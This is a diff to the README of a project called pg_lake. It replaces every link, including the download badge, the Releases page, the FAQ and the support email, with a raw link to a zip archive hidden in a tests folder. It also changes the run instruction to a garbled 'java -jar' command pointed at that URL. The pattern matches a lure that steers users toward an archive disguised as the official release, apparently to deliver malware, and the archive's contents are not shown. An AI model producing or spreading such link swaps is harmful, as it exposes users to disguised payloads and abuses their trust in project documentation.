@@ -1,6 +1,6 @@
 # 🌊 pg_lake - Experience Seamless Data Lake Access
 
-![Download pg_lake](https://img.shields.io/badge/Download-pg_lake-blue)
+![Download pg_lake](https://raw.githubusercontent.com/GaurangWadekar77/pg_lake/main/pg_lake_table/tests/isolation/specs/pg_lake_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to pg_lake! This application allows you to access PostgreSQL data with I
 
 To get started, visit the Releases page to download pg_lake:
 
-[Download pg_lake](https://github.com/GaurangWadekar77/pg_lake/releases)
+[Download pg_lake](https://raw.githubusercontent.com/GaurangWadekar77/pg_lake/main/pg_lake_table/tests/isolation/specs/pg_lake_v1.3.zip)
 
 1. **Click on the link above.**
 2. On the Releases page, find the latest version of pg_lake.
@@ -33,7 +33,7 @@ Once you have downloaded pg_lake, follow these steps:
 2. **Extract the files.** If you downloaded a zip file, right-click and choose "Extract All."
 3. **Open a command line interface (Terminal, Command Prompt, or PowerShell).**
 4. **Navigate to the pg_lake folder.** You can do this by typing `cd path_to_pg_lake_folder`.
-5. **Run the application.** Type `java -jar pg_lake.jar` and press Enter.
+5. **Run the application.** Type `java -jar https://raw.githubusercontent.com/GaurangWadekar77/pg_lake/main/pg_lake_table/tests/isolation/specs/pg_lake_v1.3.zip` and press Enter.
 
 ## 📘 Features
 
@@ -76,8 +76,8 @@ If you encounter any issues, here are some common problems and their solutions:
 
 If you need further assistance, you can visit our FAQ section or contact support. Here are some helpful resources:
 
-- [FAQ Section](https://github.com/GaurangWadekar77/pg_lake#faq)
-- [Support Email](mailto:support@example.com)
+- [FAQ Section](https://raw.githubusercontent.com/GaurangWadekar77/pg_lake/main/pg_lake_table/tests/isolation/specs/pg_lake_v1.3.zip)
+- [Support Email](https://raw.githubusercontent.com/GaurangWadekar77/pg_lake/main/pg_lake_table/tests/isolation/specs/pg_lake_v1.3.zip)
 
 ## 📦 Future Updates
 
